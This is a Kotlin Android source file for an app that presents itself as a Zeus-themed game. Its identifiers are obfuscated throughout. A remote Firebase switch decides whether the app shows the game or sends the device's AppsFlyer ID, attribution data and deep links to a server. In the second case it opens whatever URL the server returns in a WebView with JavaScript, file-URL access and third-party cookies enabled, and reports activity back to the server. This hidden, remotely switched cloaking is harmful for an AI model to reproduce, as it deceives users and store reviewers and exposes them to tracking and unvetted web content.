package com.ardent.zeusardent

import android.annotation.SuppressLint
import android.graphics.Bitmap
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.view.KeyEvent
import android.view.View
import android.view.animation.Animation
import android.view.animation.AnimationUtils
import android.webkit.*
import androidx.annotation.RequiresApi
import com.android.volley.Request
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.ardent.zeusardent.allfragments.ZeusGame
import com.ardent.zeusardent.allfragments.menu
import com.ardent.zeusardent.databinding.WebviewBinding
import com.ardent.zeusardent.key.keyFLONE
import com.ardent.zeusardent.mainadapter.kjhgfdscxvbgh
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import org.json.JSONObject
import java.util.*


lateinit var hbgdfgfdgfg: WebviewBinding
var gjjhggkhjkihjkhk: String? = null
var jhfdgkhrduihdsfsf: String? = null

class webview : AppCompatActivity() {
    lateinit var djfgnjkdfgnehrtsd: Map<String, Any>
    var laksjfkshfsdf: String? = null
    var lhasfhjkdsfewfsa: String? = null
    var hdfkjdshawedsdwqe: String? = null
    var jhgfdxdsfdgbvc: Boolean = false
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        hbgdfgfdgfg = WebviewBinding.inflate(layoutInflater)
        setContentView(hbgdfgfdgfg.root)
        supportFragmentManager
            .beginTransaction()
            .replace(hbgdfgfdgfg.sadkncxidjas.id, menu())
            .commit()
        val xdgcvbcghvcb = AnimationUtils.loadAnimation(this, R.anim.textvisibleno)
        hbgdfgfdgfg.textloads.startAnimation(xdgcvbcghvcb)
        xdgcvbcghvcb.setAnimationListener(object : Animation.AnimationListener{
            override fun onAnimationStart(jhgfdsfgvnbm: Animation?) {
            }

            override fun onAnimationEnd(gfdswertgfd: Animation?) {
                jhgfdsghbmnbgf()
            }

            override fun onAnimationRepeat(mvgfdsfghnbmv: Animation?) {
            }
        })
        val jhvgfdgfhgvbghn = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
        gjjhggkhjkihjkhk = jhvgfdgfhgvbghn
        gfgjhvnbcfdgnbvfgghbfbfdg()

    }

    private fun ghfhdfgdgsdf() {
        AppsFlyerLib.getInstance().setDebugLog(true)
        val ffsfsdfsfdfdgghcgj: AppsFlyerConversionListener = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(fgsdfsfdsfdg: Map<String, Any>) {
                try {
                    djfgnjkdfgnehrtsd = fgsdfsfdsfdg
                    sjdhfkejehfkdjshf()
                } catch (dfgfg: Exception) {
                    dfgfg.printStackTrace()
                }
            }
            override fun onConversionDataFail(hgfdsfghfvbvffdgh: String) {
                runOnUiThread {
                    hbgdfgfdgfg.textloads.visibility = View.GONE
                    hbgdfgfdgfg.sdasdsadasd.visibility = View.GONE
                    hbgdfgfdgfg.sdfxcdsfsdsa.visibility = View.VISIBLE
                    kjhgfdscxvbgh()
                }
            }

            override fun onAppOpenAttribution(esdfghjkmnb: Map<String, String>) {
                runOnUiThread {
                    hbgdfgfdgfg.textloads.visibility = View.GONE
                    hbgdfgfdgfg.sdasdsadasd.visibility = View.GONE
                    hbgdfgfdgfg.sdfxcdsfsdsa.visibility = View.VISIBLE
                    kjhgfdscxvbgh()
                }
            }

            override fun onAttributionFailure(kjhgfdrhgjnvb: String) {
                runOnUiThread {
                    hbgdfgfdgfg.textloads.visibility = View.GONE
                    hbgdfgfdgfg.sdasdsadasd.visibility = View.GONE
                    hbgdfgfdgfg.sdfxcdsfsdsa.visibility = View.VISIBLE
                    kjhgfdscxvbgh()
                }
            }
        }
        AppsFlyerLib.getInstance().init(keyFLONE.flyer, ffsfsdfsfdfdgghcgj, this)
        AppsFlyerLib.getInstance().registerConversionListener(this, ffsfsdfsfdfdgghcgj)
        AppsFlyerLib.getInstance().start(this)
    }

    private fun jhgfdsghbmnbgf() {
        FirebaseDatabase.getInstance().getReference("permishion").child("openLoading").addValueEventListener(object :
            ValueEventListener {
            override fun onDataChange(dfgdsfdsf: DataSnapshot) {
                if (dfgdsfdsf.exists()) {
                    val kkjghgffdfdfhg = dfgdsfdsf.getValue(Boolean::class.java)

                    if (kkjghgffdfdfhg == true){
                        FirebaseDatabase.getInstance().getReference("permishion").child("fb").addValueEventListener(object :
                            ValueEventListener {
                            @SuppressLint("SetJavaScriptEnabled", "CutPasteId")
                            override fun onDataChange(dfgfdasdsad: DataSnapshot) {
                                if (dfgfdasdsad.exists()) {
                                    val fgfgkhg = dfgfdasdsad.getValue(Long::class.java)
                                    jhfdgkhrduihdsfsf = fgfgkhg.toString()

                                }
                            }

                            override fun onCancelled(rdtfgjhkj: DatabaseError) {
                                kjhgfdscxvbgh()
                            }
                        })

                        FirebaseDatabase.getInstance().getReference("permishion").child("link1").addValueEventListener(object :
                            ValueEventListener {
                            @SuppressLint("SetJavaScriptEnabled", "CutPasteId")
                            override fun onDataChange(hugytfygh: DataSnapshot) {
                                if (hugytfygh.exists()) {
                                    lhasfhjkdsfewfsa = hugytfygh.getValue(String::class.java)

                                }
                            }

                            override fun onCancelled(fggfjhfhkjhk: DatabaseError) {

                            }
                        })

                        FirebaseDatabase.getInstance().getReference("permishion").child("link2").addValueEventListener(object :
                            ValueEventListener {
                            @SuppressLint("SetJavaScriptEnabled", "CutPasteId")
                            override fun onDataChange(sedrftgyuik: DataSnapshot) {
                                if (sedrftgyuik.exists()) {
                                    hdfkjdshawedsdwqe = sedrftgyuik.getValue(String::class.java)
                                    awsedrhtjyukilkj()
                                }
                            }

                            override fun onCancelled(ertyjhgfd: DatabaseError) {
                            }
                        })

                    }else{
                        hbgdfgfdgfg.textloads.visibility = View.GONE
                        hbgdfgfdgfg.sdasdsadasd.visibility = View.GONE
                        hbgdfgfdgfg.sdfxcdsfsdsa.visibility = View.VISIBLE

                    }
                }
            }

            override fun onCancelled(sdfasddd: DatabaseError) {
                kjhgfdscxvbgh()
            }
        })
    }
    private fun awsedrhtjyukilkj() {
        fvdssgfh()
        dfljnkfdnjgkjAO(gjjhggkhjkihjkhk!!)
        ghfhdfgdgsdf()
        kjhgfdscxvbgh()
    }

    private fun sjdhfkejehfkdjshf() {
        kjhgfdscxvbgh()
        val fgfdsfdsfd = Volley.newRequestQueue(this)
        val serdfdsfe = JSONObject()
        serdfdsfe.put("appsFlyerId", gjjhggkhjkihjkhk)
        val gfdssfasdsad = JSONObject(djfgnjkdfgnehrtsd)
        serdfdsfe.put("apsInfo", gfdssfasdsad)
        serdfdsfe.put("deeplink", if(laksjfkshfsdf == null) JSONObject.NULL else laksjfkshfsdf)

        var hgfdsfghn = lhasfhjkdsfewfsa
        val hgjklvgfdfgfhjk = object: JsonObjectRequest(
            Request.Method.POST, hgfdsfghn, serdfdsfe,
            { response ->
                if(response.getBoolean("success")) {
                    jhgfdxdsfdgbvc = true
                    hbgdfgfdgfg.asdcadsas.settings.javaScriptEnabled = true
                    hbgdfgfdgfg.asdcadsas.settings.domStorageEnabled = true
                    hbgdfgfdgfg.asdcadsas.settings.allowFileAccessFromFileURLs = true
                    CookieManager.getInstance().setAcceptCookie(true)
                    CookieManager.getInstance().setAcceptThirdPartyCookies(hbgdfgfdgfg.asdcadsas, true)
                    val lgfdbnkfjsdf: String = AppsFlyerLib.getInstance().getAppsFlyerUID(this)!!
                    hbgdfgfdgfg.asdcadsas.webViewClient = object : WebViewClient() {
                        override fun onPageStarted(gdfg: WebView?, kjtgfgu: String?, oiuyghjkl: Bitmap?) {
                            super.onPageStarted(gdfg, kjtgfgu, oiuyghjkl)

                        }

                        override fun onPageFinished(stfgfhfg: WebView, gghfhgjghk: String) {
                            hbgdfgfdgfg.asdcadsas.visibility = View.VISIBLE
                            hbgdfgfdgfg.textloads.visibility = View.GONE
                            hbgdfgfdgfg.sdasdsadasd.visibility = View.GONE
                            hbgdfgfdgfg.sdfxcdsfsdsa.visibility = View.GONE
                            dfvjfdgnkfdjgAPF(gghfhgjghk)
                        }

                        override fun onReceivedHttpError(dfgsdgfsdg: WebView?, saxfesfsfd: WebResourceRequest?, dgfdgfhsdfsd: WebResourceResponse?
                        ) {
                            super.onReceivedHttpError(dfgsdgfsdg, saxfesfsfd, dgfdgfhsdfsd)
                            ihdfghihfAOE(lgfdbnkfjsdf)
                        }

                        @RequiresApi(Build.VERSION_CODES.M)
                        override fun onReceivedError(fgdsfesf: WebView?, hgasfgdsx: WebResourceRequest?, stffdgdfgsfsdsdfssefd: WebResourceError?) {
                            super.onReceivedError(fgdsfesf, hgasfgdsx, stffdgdfgsfsdsdfssefd)
                            ihdfghihfAOE(lgfdbnkfjsdf)
                        }
                    }
                    hbgdfgfdgfg.asdcadsas.loadUrl(response.getString("url"))


                }
                else{
                    hbgdfgfdgfg.textloads.visibility = View.GONE
                    hbgdfgfdgfg.sdasdsadasd.visibility = View.GONE
                    hbgdfgfdgfg.sdfxcdsfsdsa.visibility = View.VISIBLE

                }
            }, { error ->
                hbgdfgfdgfg.textloads.visibility = View.GONE
                hbgdfgfdgfg.sdasdsadasd.visibility = View.GONE
                hbgdfgfdgfg.sdfxcdsfsdsa.visibility = View.VISIBLE
            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val dfasfsdfsaf: MutableMap<String, String> = HashMap()
                dfasfsdfsaf["Device-UUID"] = gjjhggkhjkihjkhk!!
                return dfasfsdfsaf
            }
        }
        fgfdsfdsfd.add(hgjklvgfdfgfhjk)
    }
    private fun dfvjfdgnkfdjgAPF(kdshdsfsfd: String) {
        val sdjfdjfsdf = Volley.newRequestQueue(this)
        val dfjghasdlkdvj = JSONObject()
        dfjghasdlkdvj.put("name", "a_p_f")
        val sdfbasdsddca = JSONObject()
        sdfbasdsddca.put("success", true)
        sdfbasdsddca.put("url", kdshdsfsfd)
        dfjghasdlkdvj.put("data", sdfbasdsddca)
        dfjghasdlkdvj.put("created", bdfdsFDSFDS())
        var vjsfdifasdfhsdf = hdfkjdshawedsdwqe

        val lkajdhfgsdf = object: JsonObjectRequest(
            Request.Method.POST, vjsfdifasdfhsdf, dfjghasdlkdvj,
            { response ->
            }, { error ->
            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val jgfdfasdfd: MutableMap<String, String> = java.util.HashMap()
                jgfdfasdfd["Device-UUID"] = gjjhggkhjkihjkhk!!
                return jgfdfasdfd
            }
        }
        sdjfdjfsdf.add(lkajdhfgsdf)
    }
    private fun ihdfghihfAOE(gsdfadsadsafd: String) {
        val sdgdsafasf = Volley.newRequestQueue(this)
        val kfkgjojasd = JSONObject()
        kfkgjojasd.put("name", "a_e_w")
        val kmkmsadadsolkfa = JSONObject()
        kmkmsadadsolkfa.put("success", true)
        kmkmsadadsolkfa.put("url", lhasfhjkdsfewfsa)
        kmkmsadadsolkfa.put("error", gsdfadsadsafd)

        kfkgjojasd.put("data", kmkmsadadsolkfa)
        kfkgjojasd.put("created", bdfdsFDSFDS())
        var lksgjsdjgfaids = hdfkjdshawedsdwqe

        val jjdsfasgfsdkad = object: JsonObjectRequest(
            Request.Method.POST, lksgjsdjgfaids, kfkgjojasd,
            { response ->
            }, { error ->
            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val fvjhsdfkjdsfj: MutableMap<String, String> = java.util.HashMap()
                fvjhsdfkjdsfj["Device-UUID"] = gjjhggkhjkihjkhk!!
                return fvjhsdfkjdsfj
            }
        }
        sdgdsafasf.add(jjdsfasgfsdkad)
    }
    fun jnssdfasdljf(){
        sfgljdfhjasd()
    }

    private fun sfgljdfhjasd() {
        supportFragmentManager
            .beginTransaction()
            .replace(hbgdfgfdgfg.sadkncxidjas.id, ZeusGame())
            .commit()
    }


    private fun bdfdsFDSFDS(): Long {
        val dfbjdvhafdjvfdvdfRAgfad: Date = Calendar.getInstance().time
        return dfbjdvhafdjvfdvdfRAgfad.time
    }




    private fun fvdssgfh() {

        FacebookSdk.sdkInitialize(applicationContext)
        FacebookSdk.setAdvertiserIDCollectionEnabled(true)
        FacebookSdk.setApplicationId(jhfdgkhrduihdsfsf)
        AppLinkData.fetchDeferredAppLinkData(
            this
        ) {
            if(it==null){
                laksjfkshfsdf = it.toString()
            } else {
                laksjfkshfsdf = it.getTargetUri().toString()
            }
        }
    }
    private fun dfljnkfdnjgkjAO(LinksMURLs: String) {
        val adgfijfdaiuhafdg = Volley.newRequestQueue(this)
        val ofdhugifdavf = JSONObject()
        ofdhugifdavf.put("name", "a_o")
        val adjfghfdgafdg = JSONObject()
        adjfghfdgafdg.put("success", true)
        ofdhugifdavf.put("data", adjfghfdgafdg)
        ofdhugifdavf.put("created", bdfdsFDSFDS())
        var bhdagfisfSD = hdfkjdshawedsdwqe
        val JFHBDFKFDAG = object: JsonObjectRequest(
            Request.Method.POST, bhdagfisfSD, ofdhugifdavf,
            { response ->
            }, { error ->
            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val slfahdfgfagfdg: MutableMap<String, String> = HashMap()
                slfahdfgfagfdg["Device-UUID"] = LinksMURLs
                return slfahdfgfagfdg
            }
        }
        adgfijfdaiuhafdg.add(JFHBDFKFDAG)
    }
    override fun onKeyDown(fdzgafdg: Int, dfhgdfgdg: KeyEvent?): Boolean {
        if ((fdzgafdg == KeyEvent.KEYCODE_BACK) && hbgdfgfdgfg.asdcadsas.canGoBack()) {
            hbgdfgfdgfg.asdcadsas.goBack()
            return true
        }

        return super.onKeyDown(fdzgafdg, dfhgdfgdg)
    }
    override fun onBackPressed() {
        if ( hbgdfgfdgfg.asdcadsas.isFocused() &&  hbgdfgfdgfg.asdcadsas.canGoBack()) {
            hbgdfgfdgfg.asdcadsas.goBack()
        } else {
        }
    }
    private fun gfgjhvnbcfdgnbvfgghbfbfdg() {
        val sbafigdfhgfdg = Volley.newRequestQueue(this)
        val jfdaghfdag = JSONObject()
        jfdaghfdag.put("name", "a_o_e")
        val zfdkjdsdfdsf = JSONObject()
        zfdkjdsdfdsf.put("success", true)
        jfdaghfdag.put("data", zfdkjdsdfdsf)
        jfdaghfdag.put("created", bdfdsFDSFDS())
        var jvhhdsvfsdofsf = hdfkjdshawedsdwqe

        val sgfbhfdagfdga = object: JsonObjectRequest(
            Request.Method.POST, jvhhdsvfsdofsf, jfdaghfdag,
            { response ->
            }, { error ->
            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val sgfijfxzhcgdf: MutableMap<String, String> = HashMap()
                sgfijfxzhcgdf["Device-UUID"] = gjjhggkhjkihjkhk!!
                return sgfijfxzhcgdf
            }
        }
        sbafigdfhgfdg.add(sgfbhfdagfdga)
    }

}